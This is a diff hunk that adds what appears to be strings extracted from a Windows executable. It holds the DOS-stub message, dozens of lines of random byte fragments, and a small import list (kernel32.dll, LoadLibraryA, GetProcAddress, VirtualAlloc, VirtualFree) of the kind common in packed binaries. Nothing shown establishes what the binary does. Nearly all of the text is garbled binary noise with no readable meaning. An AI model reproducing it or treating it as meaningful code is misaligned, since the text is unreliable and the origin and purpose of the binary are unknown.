@@ -1,0 +1,52 @@
+!This program cannot be run in DOS mode.
+!c1T~~
+xc "r(
+u&eY1-
+nc6D\Vo=
+kz(1L-
+p-1IG3
+-HV0V
+q5o^=rx
+op)og 
+J6,58rM
+~Hb!yO
+L<(WyV
+&gH^S/
+2J]nmf
+*z4@)q
+E9#+$V}L
+[SHEP0
+zHb!mc
+0R7lD`9
+s-5Z_b$
+a~9(/;7
+'Ot"^[
+a4 Qj=
+t!,/SUc
+'3e:Cj
+Cd#D6}
+;gA*s9
+:}8`!n
+KGAu}D
+OZVQ[g0
+=tN(;A
+ *BZ9G
+PqKlo5
+[uxikU
+kernel32.dll
+LoadLibraryA
+GetProcAddress
+VirtualAlloc
+VirtualFree
+P-XpT@
+"C uXC;
+%r!pj-
+l70,j?
+on 8er
+%os5/l
+BoxpA{w
+?ExitP
+and?p=Opx
+(Fi-$Du
+USQWVR
+Z^_Y[]
